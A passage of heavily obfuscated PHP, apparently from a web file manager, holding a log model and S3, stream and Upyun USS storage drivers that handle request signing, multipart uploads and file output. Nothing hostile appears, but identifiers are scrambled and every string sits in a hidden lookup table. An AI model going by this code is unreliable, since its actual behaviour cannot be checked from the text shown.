=> Session::sign(), $â­çóŸÄ[1646] => $µ­¯îÖ, $â­çóŸÄ[33] => $ë‚«şÍ, $â­çóŸÄ[1648] => json_encode($®ì·ëõ‹)); parent::add($®ì·ëõ‹); } public function remove($«éê–¸Î) { $this->where(array($_SERVER[„Ç©ñÎ©][428] => $«éê–¸Î))->delete(); } private function _makeOrder($şÈå‰ğÓ = '') { $úÕÜ‡ó =& $_SERVER[„Ç©ñÎ©]; $¡êè¼çï = $úÕÜ‡ó[210]; $®ƒ•¸ıÑ = array($úÕÜ‡ó[459] => $úÕÜ‡ó[460], $úÕÜ‡ó[461] => $úÕÜ‡ó[462]); $Ú—®¬©å = Input::get($úÕÜ‡ó[467], $úÕÜ‡ó[7], $úÕÜ‡ó[1996], array($úÕÜ‡ó[1918], $úÕÜ‡ó[461])); $Ú—®¬©å = $®ƒ•¸ıÑ[$Ú—®¬©å]; $şÈå‰ğÓ = $şÈå‰ğÓ . "{$¡êè¼çï}\40{$Ú—®¬©å}"; return $this->order($şÈå‰ğÓ); } public function get($ãÃå™øş = '') { $Àû†ãµœ =& $_SERVER[„Ç©ñÎ©]; if (!$ãÃå™øş) { show_json(array()); } $¤°ÚêÈ„ = array(); if ($ãÃå™øş[$Àû†ãµœ[1655]]) { $¤°ÚêÈ„[$Àû†ãµœ[1655]] = $ãÃå™øş[$Àû†ãµœ[1655]]; } if (isset($ãÃå™øş[$Àû†ãµœ[764]])) { $ôËÛ¦×Ÿ = $ãÃå™øş[$Àû†ãµœ[764]]; $è½ú ½á = isset($ãÃå™øş[$Àû†ãµœ[506]]) ? $ãÃå™øş[$Àû†ãµœ[506]] : time(); $¤°ÚêÈ„[$Àû†ãµœ[210]] = array($Àû†ãµœ[342], array($ôËÛ¦×Ÿ, $è½ú ½á)); } if ($ãÃå™øş[$Àû†ãµœ[33]]) { $Ì™²«ø = explode($Àû†ãµœ[50], $ãÃå™øş[$Àû†ãµœ[33]]); $´ÕŒü‹ = $this->typeFile(); $×›’°³Ú = array(); foreach ($Ì™²«ø as $ôÍĞí¥¾) { $×›’°³Ú[] = $ôÍĞí¥¾; if (isset($´ÕŒü‹[$ôÍĞí¥¾])) { $×›’°³Ú = array_merge($×›’°³Ú, $´ÕŒü‹[$ôÍĞí¥¾]); } } $×›’°³Ú = array_unique($×›’°³Ú); if ($×›’°³Ú) { $¤°ÚêÈ„[$Àû†ãµœ[33]] = array($Àû†ãµœ[7], $×›’°³Ú); } } else { $¤°ÚêÈ„[$Àû†ãµœ[33]] = array($Àû†ãµœ[2243], $Àû†ãµœ[2244]); } if (!empty($ãÃå™øş[$Àû†ãµœ[2242]])) { $¤°ÚêÈ„[$Àû†ãµœ[462]] = array($Àû†ãµœ[392], "\45{$ãÃå™øş[$Àû†ãµœ[2242]]}\45"); } $¹¿¿»Ôô = $this->_makeOrder()->where($¤°ÚêÈ„)->selectPage(); if (empty($¹¿¿»Ôô[$Àû†ãµœ[378]])) { show_json(array(), !0, $¹¿¿»Ôô[$Àû†ãµœ[375]]); } $¹¿¿»Ôô[$Àû†ãµœ[378]] = $this->logList($¹¿¿»Ôô[$Àû†ãµœ[378]]); return $¹¿¿»Ôô; } private function ipAddress(&$¼‚»ÅÁ½) { $Òª€óÇŞ =& $_SERVER[„Ç©ñÎ©]; if (!empty($¼‚»ÅÁ½[$Òª€óÇŞ[2242]])) { $£‚õûÊÓ = IpLocation::get($¼‚»ÅÁ½[$Òª€óÇŞ[2242]]); } else { $£‚õûÊÓ = LNG($Òª€óÇŞ[2245]); } $¼‚»ÅÁ½[$Òª€óÇŞ[2246]] = $£‚õûÊÓ; } private function descZipDownload($˜¦‡¿°Ë, &$íüæ±Ú) { $ÜÍúú–Â =& $_SERVER[„Ç©ñÎ©]; if (!isset($˜¦‡¿°Ë[$ÜÍúú–Â[2247]])) { return; } $å‹¬ãš = json_decode($˜¦‡¿°Ë[$ÜÍúú–Â[2247]], !0); foreach ($å‹¬ãš as $áÓ°Ã¦) { try { $àÂÓüöË = IO::infoFull($áÓ°Ã¦[$ÜÍúú–Â[94]]); } catch (Exception $‘©¶®‘) { continue; } $˜¦‡¿°Ë[$ÜÍúú–Â[94]] = $áÓ°Ã¦[$ÜÍúú–Â[94]]; $íüæ±Ú[] = $˜¦‡¿°Ë[$ÜÍúú–Â[411]] = $àÂÓüöË[$ÜÍúú–Â[411]]; $íüæ±Ú[] = $˜¦‡¿°Ë[$ÜÍúú–Â[2050]] = $àÂÓüöË[$ÜÍúú–Â[441]]; break; } return $˜¦‡¿°Ë; } private function getSourceList(&$¬†¼ê¼) { $ñİÎò…¸ =& $_SERVER[„Ç©ñÎ©]; $öÔÙõß = array(); foreach ($¬†¼ê¼ as $Æù¸Ş¹¢ => $²ˆ»Š£ù) { $‹ŠŠÎ½ = json_decode($²ˆ»Š£ù[$ñİÎò…¸[462]], !0); if ($²ˆ»Š£ù[$ñİÎò…¸[33]] == $ñİÎò…¸[1801]) { $‹ŠŠÎ½ = $this->descZipDownload($‹ŠŠÎ½, $öÔÙõß); $¬†¼ê¼[$Æù¸Ş¹¢][$ñİÎò…¸[462]] = json_encode($‹ŠŠÎ½); continue; } if (strpos($²ˆ»Š£ù[$ñİÎò…¸[33]], $ñİÎò…¸[2052]) !== 0) { if (!isset($‹ŠŠÎ½[$ñİÎò…¸[94]]) || strpos($²ˆ»Š£ù[$ñİÎò…¸[33]], $ñİÎò…¸[2248]) !== 0) { continue; } try { $•º¢¡ÃÃ = IO::infoFull($‹ŠŠÎ½[$ñİÎò…¸[94]]); } catch (Exception $‹²ÆÆƒĞ) { continue; } $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[411]] = $•º¢¡ÃÃ[$ñİÎò…¸[411]]; $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[2050]] = $•º¢¡ÃÃ[$ñİÎò…¸[441]]; $¬†¼ê¼[$Æù¸Ş¹¢][$ñİÎò…¸[462]] = json_encode($‹ŠŠÎ½); continue; } $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[411]]; $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[2050]]; if ($‹ŠŠÎ½[$ñİÎò…¸[33]] == $ñİÎò…¸[566]) { $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[462]][$ñİÎò…¸[1159]]; $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[462]][$ñİÎò…¸[1160]]; } if ($‹ŠŠÎ½[$ñİÎò…¸[33]] == $ñİÎò…¸[2060]) { $öÔÙõß[] = $‹ŠŠÎ½[$ñİÎò…¸[462]][$ñİÎò…¸[411]]; } } if (!$öÔÙõß) { return array(); } return Model($ñİÎò…¸[828])->sourceListInfo($öÔÙõß, !0); } private function logList($Ù½‚›») { $½İùÔäù =& $_SERVER[„Ç©ñÎ©]; $›èŒöƒÂ = array_to_keyvalue($Ù½‚›», $½İùÔäù[12], $½İùÔäù[1655]); $¦Ûê´ = Model($½İùÔäù[544])->userListInfo(array_unique($›èŒöƒÂ)); $Ğ¸ª™ƒ = $this->getSourceList($Ù½‚›»); $˜øéúÙ– = $this->typeAll(); $øÇÖÔš² = array(); $¢ØöÈ‹— = array(); foreach ($Ù½‚›» as $”„¢Àö¨ => $Å£Óğ›Ù) { $ª˜‘¯¦í = $Å£Óğ›Ù[$½İùÔäù[33]]; $È…’ºÓ² = isset($¦Ûê´[$Å£Óğ›Ù[$½İùÔäù[1655]]]) ? $¦Ûê´[$Å£Óğ›Ù[$½İùÔäù[1655]]] : !1; $°ÍÚ¹‘³ = strpos($ª˜‘¯¦í, $½İùÔäù[2249]) === 0 ? LNG($½İùÔäù[2250]) : LNG($½İùÔäù[2245]); $Å£Óğ›Ù[$½İùÔäù[32]] = isset($È…’ºÓ²[$½İùÔäù[32]]) ? $È…’ºÓ²[$½İùÔäù[32]] : LNG($½İùÔäù[2245]); $Å£Óğ›Ù[$½İùÔäù[551]] = isset($È…’ºÓ²[$½İùÔäù[551]]) ? $È…’ºÓ²[$½İùÔäù[551]] : $½İùÔäù[12]; $Å£Óğ›Ù[$½İùÔäù[1554]] = isset($˜øéúÙ–[$ª˜‘¯¦í]) ? $˜øéúÙ–[$ª˜‘¯¦í] : $°ÍÚ¹‘³; $Å£Óğ›Ù[$½İùÔäù[1995]] = $È…’ºÓ²; $Ğ–¹¨Ïğ = json_decode($Å£Óğ›Ù[$½İùÔäù[462]], !0); $Å£Óğ›Ù[$½İùÔäù[2242]] = isset($Ğ–¹¨Ïğ[$½İùÔäù[2242]]) ? $Ğ–¹¨Ïğ[$½İùÔäù[2242]] : $½İùÔäù[12]; $Å£Óğ›Ù[$½İùÔäù[2246]] = IpLocation::get($Å£Óğ›Ù[$½İùÔäù[2242]]); if (strpos($ª˜‘¯¦í, $½İùÔäù[2052]) === 0 || isset($Ğ–¹¨Ïğ[$½İùÔäù[2050]])) { $Ğ–¹¨Ïğ[$½İùÔäù[96]] = $Ğ¸ª™ƒ[$Ğ–¹¨Ïğ[$½İùÔäù[411]]]; $Ğ–¹¨Ïğ[$½İùÔäù[2065]] = $Ğ¸ª™ƒ[$Ğ–¹¨Ïğ[$½İùÔäù[2050]]]; if ($Ğ–¹¨Ïğ[$½İùÔäù[33]] == $½İùÔäù[566]) { $Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[1159]] = $Ğ¸ª™ƒ[$Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[1159]]]; $Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[1160]] = $Ğ¸ª™ƒ[$Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[1160]]]; } if ($Ğ–¹¨Ïğ[$½İùÔäù[33]] == $½İùÔäù[2060]) { $Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[411]] = $Ğ¸ª™ƒ[$Ğ–¹¨Ïğ[$½İùÔäù[462]][$½İùÔäù[411]]]; } if ($Ğ–¹¨Ïğ[$½İùÔäù[33]] == $½İùÔäù[1796]) { $Ğ–¹¨Ïğ[$½İùÔäù[2065]] = $Ğ–¹¨Ïğ[$½İùÔäù[96]]; $Ğ–¹¨Ïğ[$½İùÔäù[2050]] = $Ğ–¹¨Ïğ[$½İùÔäù[2065]][$½İùÔäù[411]]; $Ğ–¹¨Ïğ[$½İùÔäù[96]] = !1; $Ğ–¹¨Ïğ[$½İùÔäù[411]] = $½İùÔäù[12]; } if ($Ğ–¹¨Ïğ[$½İùÔäù[96]] && $Ğ–¹¨Ïğ[$½İùÔäù[96]][$½İùÔäù[420]] == $½İùÔäù[1275]) { $¢ØöÈ‹—[] = $Å£Óğ›Ù[$½İùÔäù[408]]; unset($Ù½‚›»[$”„¢Àö¨]); continue; } if ($Ğ–¹¨Ïğ[$½İùÔäù[2065]] && $Ğ–¹¨Ïğ[$½İùÔäù[2065]][$½İùÔäù[420]] == $½İùÔäù[1275]) { $¢ØöÈ‹—[] = $Å£Óğ›Ù[$½İùÔäù[408]]; unset($Ù½‚›»[$”„¢Àö¨]); continue; } } $Å£Óğ›Ù[$½İùÔäù[462]] = $Ğ–¹¨Ïğ; unset($Å£Óğ›Ù[$½İùÔäù[2251]]); $øÇÖÔš²[] = $Å£Óğ›Ù; } $this->clearSystemPathLog($¢ØöÈ‹—); return $øÇÖÔš²; } private function clearSystemPathLog($“ÂøŞ¹ï) { $ÎªÈğî =& $_SERVER[„Ç©ñÎ©]; if (count($“ÂøŞ¹ï) == 0) { return; } $¬¤Èü¯´ = array($ÎªÈğî[408] => array($ÎªÈğî[7], array_unique($“ÂøŞ¹ï))); $this->where($¬¤Èü¯´)->delete(); } public function deviceList($´ëØíõÇ, $Øî÷–ë = 0) { $ã“ Ûºá =& $_SERVER[„Ç©ñÎ©]; $Á“¤Éï = array($ã“ Ûºá[1655] => $´ëØíõÇ, $ã“ Ûºá[210] => array($ã“ Ûºá[1013], $Øî÷–ë), $ã“ Ûºá[33] => $ã“ Ûºá[1770]); $©İó­™ = array(); $æâş´€ß = $this->field($ã“ Ûºá[2252])->where($Á“¤Éï)->order($ã“ Ûºá[2063])->limit(50)->select(); foreach ($æâş´€ß as $Å—»˜âÁ => $„èÔ´†) { if ($Å—»˜âÁ > 0 && abs($„èÔ´†[$ã“ Ûºá[210]] - $æâş´€ß[$Å—»˜âÁ - 1][$ã“ Ûºá[210]]) < 5) { continue; } $›¤ñú = json_decode($„èÔ´†[$ã“ Ûºá[462]], !0); $„èÔ´†[$ã“ Ûºá[2242]] = isset($›¤ñú[$ã“ Ûºá[2242]]) ? $›¤ñú[$ã“ Ûºá[2242]] : $ã“ Ûºá[12]; unset($›¤ñú[$ã“ Ûºá[2242]]); $Ş³„âÂ¢ = $this->deviceType($›¤ñú[$ã“ Ûºá[2053]]); if (isset($©İó­™[$Ş³„âÂ¢])) { continue; } $„èÔ´†[$ã“ Ûºá[2246]] = IpLocation::get($„èÔ´†[$ã“ Ûºá[2242]]); $„èÔ´†[$ã“ Ûºá[462]] = $›¤ñú; $©İó­™[$Ş³„âÂ¢] = $„èÔ´†; } return array_values($©İó­™); } public function deviceType($ıÈµÍî°) { return $ıÈµÍî°; } } goto FÌ„çØóİ«; DâôÌÔ®Î: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($™­ŞúÊà) { parent::__construct($™­ŞúÊà); } public function uploadFormData($·èÈ¢­ä, $î—™¹ æ = 3600) { $÷º¢Üê’ =& $_SERVER[„Ç©ñÎ©]; $ğ”…¾Ë = $÷º¢Üê’[208]; $­ŠƒæĞÁ = $÷º¢Üê’[1345]; $ÂÆÂúĞÖ = $÷º¢Üê’[72]; $ôÍÂ½¾Æ = gmdate($÷º¢Üê’[1346]); $¥Ò—æÕĞ = gmdate($÷º¢Üê’[754]); $šà‚şÓœ = $÷º¢Üê’[1347]; $Óú¸âêÊ = $î—™¹ æ . $÷º¢Üê’[12]; $çİñ£—ƒ = $÷º¢Üê’[1309]; $İçêÚü¿ = array($this->accessKey, $¥Ò—æÕĞ, $this->region, $ÂÆÂúĞÖ, $šà‚şÓœ); $‘ëç¨‚ = implode($÷º¢Üê’[8], $İçêÚü¿); $…Ù†ïİÂ = array($÷º¢Üê’[1311] => gmdate($÷º¢Üê’[1310], strtotime($÷º¢Üê’[1348])), $÷º¢Üê’[1312] => array(array($÷º¢Üê’[1314] => $this->bucket), array($÷º¢Üê’[1313] => $ğ”…¾Ë), array($÷º¢Üê’[1315], $÷º¢Üê’[1316], $÷º¢Üê’[12]), array($÷º¢Üê’[1315], $÷º¢Üê’[1349], $÷º¢Üê’[12]), array($÷º¢Üê’[1315], $÷º¢Üê’[1350], $÷º¢Üê’[12]), array($÷º¢Üê’[1317] => $çİñ£—ƒ), array($÷º¢Üê’[1351] => $‘ëç¨‚), array($÷º¢Üê’[1352] => $­ŠƒæĞÁ), array($÷º¢Üê’[1353] => $ôÍÂ½¾Æ), array($÷º¢Üê’[1354] => $Óú¸âêÊ))); $Õ¤„†‡ª = base64_encode(json_encode($…Ù†ïİÂ)); $¯İ•”¿¨ = hash_hmac($÷º¢Üê’[1355], $¥Ò—æÕĞ, $÷º¢Üê’[1356] . $this->secret, !0); $ˆ€¸İ¢— = hash_hmac($÷º¢Üê’[1355], $this->region, $¯İ•”¿¨, !0); $ë·ó†á¡ = hash_hmac($÷º¢Üê’[1355], $ÂÆÂúĞÖ, $ˆ€¸İ¢—, !0); $°êÓà® = hash_hmac($÷º¢Üê’[1355], $šà‚şÓœ, $ë·ó†á¡, !0); $‹ò¾íº = hash_hmac($÷º¢Üê’[1355], $Õ¤„†‡ª, $°êÓà®); $çòÛ¨±¶ = array($÷º¢Üê’[225] => $÷º¢Üê’[12], $÷º¢Üê’[1357] => $÷º¢Üê’[12], $÷º¢Üê’[1313] => $ğ”…¾Ë, $÷º¢Üê’[1317] => $çİñ£—ƒ, $÷º¢Üê’[1321] => $Õ¤„†‡ª, $÷º¢Üê’[1358] => $‘ëç¨‚, $÷º¢Üê’[1359] => $­ŠƒæĞÁ, $÷º¢Üê’[1360] => $ôÍÂ½¾Æ, $÷º¢Üê’[1361] => $Óú¸âêÊ, $÷º¢Üê’[1362] => $‹ò¾íº, $÷º¢Üê’[191] => $this->getHost()); return $çòÛ¨±¶; } public function multiUploadFormData($ùôì£³Ì, $ı³¥§áŠ = 3600) { $ÇÄñï =& $_SERVER[„Ç©ñÎ©]; $©Ø²¿· = gmdate($ÇÄñï[1441]); $±½‘ÒÃï = array(); $ŸæœÈè = $this->client->getUploadId($this->bucket, $ùôì£³Ì, $±½‘ÒÃï); if (!$ŸæœÈè) { return !1; } return array($ÇÄñï[233] => $ŸæœÈè, $ÇÄñï[191] => $this->getHost() . $ÇÄñï[8] . $this->pathEncode($ùôì£³Ì), $ÇÄñï[234] => $©Ø²¿·, $ÇÄñï[104] => $ùôì£³Ì); } public function multiUploadAuthData($†ä®˜•, $‘‰¼ÀŠÂ = array()) { $ŠîÍà =& $_SERVER[„Ç©ñÎ©]; $†„’‘é = isset($‘‰¼ÀŠÂ[$ŠîÍà[184]]) ? $‘‰¼ÀŠÂ[$ŠîÍà[184]] : $ŠîÍà[12]; $‹ãîöô« = $‘‰¼ÀŠÂ[$ŠîÍà[104]]; unset($‘‰¼ÀŠÂ[$ŠîÍà[104]]); if (isset($‘‰¼ÀŠÂ[$ŠîÍà[235]])) { return $this->listUploadParts($‹ãîöô«, $‘‰¼ÀŠÂ); } $ƒ“­½î– = array(); if (isset($‘‰¼ÀŠÂ[$ŠîÍà[1442]])) { $ƒ“­½î–[$ŠîÍà[1443]] = $‘‰¼ÀŠÂ[$ŠîÍà[1442]]; } $æ¨©õÊÎ = explode($ŠîÍà[193], $this->getHost()); $ñÜ“÷ûà = array($ŠîÍà[1444] => $æ¨©õÊÎ[1], $ŠîÍà[1445] => $ŠîÍà[12], $ŠîÍà[225] => $ŠîÍà[130], $ŠîÍà[1357] => $‘‰¼ÀŠÂ[$ŠîÍà[86]]); $­¨¤şïí = $ŠîÍà[238]; $öäÌàí‹ = $ŠîÍà[8] . $this->pathEncode($‹ãîöô«) . $†„’‘é; $ËÂõ„ˆ = $this->client->__getSignatureV4($ƒ“­½î–, $ñÜ“÷ûà, $­¨¤şïí, $öäÌàí‹); if (strpos($†„’‘é, $ŠîÍà[237]) === 0) { if (isset($ƒ“­½î–[$ŠîÍà[1443]])) { $Áº Ë» = $ƒ“­½î–[$ŠîÍà[1443]]; } else { if (isset($ËÂõ„ˆ[$ŠîÍà[1443]])) { $Áº Ë» = $ËÂõ„ˆ[$ŠîÍà[1443]]; } else { $Áº Ë» = hash($ŠîÍà[1355], $ŠîÍà[12]); } } return array($ŠîÍà[243] => $ËÂõ„ˆ[$ŠîÍà[243]], $ŠîÍà[1443] => $Áº Ë», $ŠîÍà[234] => $ËÂõ„ˆ[$ŠîÍà[1446]]); } return $ËÂõ„ˆ[$ŠîÍà[243]]; } public function listUploadParts($ëˆ”ïÈ, $­ÕÜ„œ‰ = array()) { $¼Ğäè¹â =& $_SERVER[„Ç©ñÎ©]; $è¿†ö¿Ü = str_replace($¼Ğäè¹â[244], $¼Ğäè¹â[12], $­ÕÜ„œ‰[$¼Ğäè¹â[184]]); $óèÏ¦’ş = $this->client->listParts($this->bucket, $ëˆ”ïÈ, $è¿†ö¿Ü); if (!$óèÏ¦’ş) { return !1; } $²©ü¦Œ = $¼Ğäè¹â[1447]; foreach ($óèÏ¦’ş as $÷ıÛ»‹) { $²©ü¦Œ .= $¼Ğäè¹â[1448] . "\x3c\x50\141\162\x74\116\x75\155\x62\145\162\76{$÷ıÛ»‹[$¼Ğäè¹â[1402]]}\74\57\x50\x61\162\164\x4e\x75\x6d\x62\145\162\76\xa" . "\74\x45\124\141\x67\x3e{$÷ıÛ»‹[$¼Ğäè¹â[1403]]}\74\57\x45\124\141\x67\x3e\12" . $¼Ğäè¹â[1449]; } $²©ü¦Œ .= $¼Ğäè¹â[1450]; $úóçş½ = array(); $¼ĞÜÀæ = explode($¼Ğäè¹â[193], $this->getHost()); $¨Ş‡Ø«Õ = array($¼Ğäè¹â[1444] => $¼ĞÜÀæ[1], $¼Ğäè¹â[225] => $¼Ğäè¹â[130], $¼Ğäè¹â[1357] => strlen($²©ü¦Œ)); $ûŸÈ› = $¼Ğäè¹â[236]; $…åĞò— = $¼Ğäè¹â[8] . $this->pathEncode($ëˆ”ïÈ) . $­ÕÜ„œ‰[$¼Ğäè¹â[184]]; $‘Ç¿›¬ı = $this->client->__getSignatureV4($úóçş½, $¨Ş‡Ø«Õ, $ûŸÈ›, $…åĞò—, $²©ü¦Œ); return array($¼Ğäè¹â[243] => $‘Ç¿›¬ı[$¼Ğäè¹â[243]], $¼Ğäè¹â[234] => $‘Ç¿›¬ı[$¼Ğäè¹â[1446]], $¼Ğäè¹â[245] => $óèÏ¦’ş, $¼Ğäè¹â[1443] => $‘Ç¿›¬ı[$¼Ğäè¹â[1443]]); } public function link($¯Ï ı¾Ä, $“¾›°± = array()) { return parent::link($¯Ï ı¾Ä, $“¾›°±); } public function fileOut($Ô¬òõÜ£, $ó„¬±€À = false, $ùÑúÎ¥á = false, $’«ÍÕŒ³ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[„Ç©ñÎ©][1451])) { return parent::fileOutServer($Ô¬òõÜ£, $ó„¬±€À, $ùÑúÎ¥á, $’«ÍÕŒ³); } parent::fileOut($Ô¬òõÜ£, $ó„¬±€À, $ùÑúÎ¥á, $’«ÍÕŒ³); } public function fileOutImage($ÈşüÓÆÁ, $ğôà…ò = 250) { if (strstr($this->endpoint, $_SERVER[„Ç©ñÎ©][1451])) { return parent::fileOutImageServer($ÈşüÓÆÁ, $ğôà…ò); } parent::fileOutImage($ÈşüÓÆÁ, $ğôà…ò); } public function fileOutLink($Ïú¸­¼) { $¤ÉÏ ©Æ =& $_SERVER[„Ç©ñÎ©]; if (substr($Ïú¸­¼, 0, 7) == $¤ÉÏ ©Æ[1324]) { $Ïú¸­¼ = $¤ÉÏ ©Æ[1325] . substr($Ïú¸­¼, 7); } header($¤ÉÏ ©Æ[171] . $Ïú¸­¼); die; } public function getHost() { $ûæ”ÅÏÈ =& $_SERVER[„Ç©ñÎ©]; $Áñ‡ÊĞƒ = str_rtrim(parent::getHost(), $ûæ”ÅÏÈ[8] . $this->bucket); $Áñ‡ÊĞƒ = explode($ûæ”ÅÏÈ[193], $Áñ‡ÊĞƒ); return $Áñ‡ÊĞƒ[0] . $ûæ”ÅÏÈ[193] . $this->bucket . $ûæ”ÅÏÈ[10] . $Áñ‡ÊĞƒ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($€ŸìÄ¯û, $•â¿ñÆĞ = 0) { parent::__construct(); $this->source = $€ŸìÄ¯û; $this->sourceSize = $•â¿ñÆĞ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ûÛÃ¯ = false) { return $this->sourceSize; } public function getContent($˜úÄ™Í = false) { return $this->fileSubstr($˜úÄ™Í, 0, $this->sourceSize); } public function fileSubstr($‹£¤É¨š = false, $¯‚ÛÂÍº = 0, $Õ’ğ÷´Æ = 0) { if (!$Õ’ğ÷´Æ) { $Õ’ğ÷´Æ = $this->sourceSize; } $É”Û’¯ = $this->sourceSize - $¯‚ÛÂÍº; if ($Õ’ğ÷´Æ >= $É”Û’¯) { $Õ’ğ÷´Æ = $É”Û’¯; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¯‚ÛÂÍº, $Õ’ğ÷´Æ); } if ($this->sourceType == self::TYPE_FILE) { if ($Õ’ğ÷´Æ <= 0) { return $_SERVER[„Ç©ñÎ©][12]; } $ŸíñÈä‹ = ftell($this->source); fseek_64($this->source, $ŸíñÈä‹ + $¯‚ÛÂÍº); $Æ‡ÌèÍä = @fread($this->source, $Õ’ğ÷´Æ); fseek_64($this->source, $ŸíñÈä‹); return $Æ‡ÌèÍä; } } public function hashMd5($€­ñìõã = false) { return md5($this->getContent()); } public static function hash($ÛÒÜŸ§Ä, $Š·¥–¾ß = 0) { $Ãºñ›‰î = new PathDriverStream($ÛÒÜŸ§Ä, $Š·¥–¾ß); return $Ãºñ›‰î->hashSimple($ÛÒÜŸ§Ä); } public static function md5($§ŸßÛ±ë, $ä½«°ì° = 0) { $¨ñ÷Üø = new PathDriverStream($§ŸßÛ±ë, $ä½«°ì°); return $¨ñ÷Üø->hashMd5($§ŸßÛ±ë); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\57\57\x76\60\56\141\x70\x69\56\165\160\x79\165\x6e\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¶·ú…îı) { parent::__construct(); $this->_init($¶·ú…îı); } public function _init($©Ä¢¢ò») { $‡Ÿ½õğş =& $_SERVER[„Ç©ñÎ©]; foreach ($©Ä¢¢ò» as $Â—÷Ø‰ü => $£¤³õŠ­) { if (isset($this->{$Â—÷Ø‰ü})) { $this->{$Â—÷Ø‰ü} = $£¤³õŠ­; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‡Ÿ½õğş[1452] . LNG($‡Ÿ½õğş[1383])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÉÌ¸Ï€ï, $Ğµ¡‹šÛ = "\x47\105\x54") { $·£ÄúÓª =& $_SERVER[„Ç©ñÎ©]; $¿±¿ù× = gmdate($·£ÄúÓª[1416]); $¥êÑ’Û = base64_encode(hash_hmac($·£ÄúÓª[1453], "{$Ğµ¡‹šÛ}\46{$ÉÌ¸Ï€ï}\x26{$¿±¿ù×}", md5("{$this->userpass}"), !0)); $ÅºƒöÙÂ = array("\x41\x75\164\x68\x6f\162\151\172\141\x74\151\x6f\156\72\x55\120\x59\x55\116\x20{$this->username}\72{$¥êÑ’Û}", "\104\141\164\145\72{$¿±¿ù×}"); return $ÅºƒöÙÂ; } public function ussRequest($¼–Í™ø®, $ÉëÓ¿µ = "\x47\x45\124", $¾ö Á¢ì = false, $ï²©‰ = false, $ßÖÁ‘È = false) { $æ¤©”‘ =& $_SERVER[„Ç©ñÎ©]; $¼–Í™ø® = trim($¼–Í™ø®, $æ¤©”‘[8]); $í§ïˆû¸ = "\x2f{$this->bucket}\x2f{$¼–Í™ø®}"; $¢Òİ ı = $this->ussHeaders($í§ïˆû¸, $ÉëÓ¿µ); if ($ï²©‰) { $¢Òİ ı = array_merge($¢Òİ ı, $ï²©‰); } $Ï•à©¾Ó = url_request($this->endpoint . $í§ïˆû¸, $ÉëÓ¿µ, $¾ö Á¢ì, $¢Òİ ı, $ßÖÁ‘È); if (!$Ï•à©¾Ó) { return array($æ¤©”‘[1190] => !1, $æ¤©”‘[1192] => $æ¤©”‘[1454]); } if (strtolower($ÉëÓ¿µ) == $æ¤©”‘[206] || in_array($Ï•à©¾Ó[$æ¤©”‘[1190]], array($æ¤©”‘[1309], $æ¤©”‘[1455]))) { $¾ö Á¢ì = $Ï•à©¾Ó[$æ¤©”‘[1456]]; } else { $¾ö Á¢ì = json_decode($Ï•à©¾Ó[$æ¤©”‘[1192]], !0); if (!$¾ö Á¢ì) { $¾ö Á¢ì = $Ï•à©¾Ó[$æ¤©”‘[1192]]; } else { if (!$Ï•à©¾Ó[$æ¤©”‘[753]] && isset($¾ö Á¢ì[$æ¤©”‘[1457]])) { $¾ö Á¢ì = $¾ö Á¢ì[$æ¤©”‘[1457]]; } } } return array($æ¤©”‘[1190] => $Ï•à©¾Ó[$æ¤©”‘[753]], $æ¤©”‘[1192] => $¾ö Á¢ì); } public function mkfile($“ÑÎ“²Ú, $ÜÌâÒş‡ = '', $ÏÍ™¼Õô = REPEAT_RENAME) { if ($this->setContent($“ÑÎ“²Ú, $ÜÌâÒş‡)) { return $this->getPathOuter($“ÑÎ“²Ú); } return !1; } public function mkdir($Û×¸»ˆİ, $İÛĞÌâ‹ = REPEAT_SKIP) { $´§§šî¹ =& $_SERVER[„Ç©ñÎ©]; $Ù à„×Ï = trim($Û×¸»ˆİ, $´§§šî¹[8]); if ($this->_isFolder($Ù à„×Ï)) { return $this->getPathOuter($Ù à„×Ï); } $ÅÉµÙä = array($´§§šî¹[1458]); $€ÃÄøç = $this->ussRequest($Ù à„×Ï, $´§§šî¹[236], !1, $ÅÉµÙä); return $€ÃÄøç[$´§§šî¹[1190]] ? $this->getPathOuter($Ù à„×Ï) : !1; } public function copyFile($šâ‰­ìÔ, $â‰ŠÀøÕ) { $½Ş¿Í › =& $_SERVER[„Ç©ñÎ©]; $³²úóœê = array($½Ş¿Í ›[1459] . "\x2f{$this->bucket}\57{$šâ‰­ìÔ}", $½Ş¿Í ›[1460]); $Æ±€òÂŸ = $this->ussRequest($â‰ŠÀøÕ, $½Ş¿Í ›[238], !1, $³²úóœê); return $Æ±€òÂŸ[$½Ş¿Í ›[1190]] ? !0 : $this->getPathOuter($â‰ŠÀøÕ); } public function moveFile($æÚàÑçç, $Ñ°”ö¡ó) { $¡£ö“˜Ã =& $_SERVER[„Ç©ñÎ©]; $¿ÃÕŸÓ« = array($¡£ö“˜Ã[1461] . "\57{$this->bucket}\57{$æÚàÑçç}", $¡£ö“˜Ã[1460]); $˜öŸ¢ = $this->ussRequest($Ñ°”ö¡ó, $¡£ö“˜Ã[238], !1, $¿ÃÕŸÓ«); return $˜öŸ¢[$¡£ö“˜Ã[1190]] ? !0 : $this->getPathOuter($Ñ°”ö¡ó); } public function 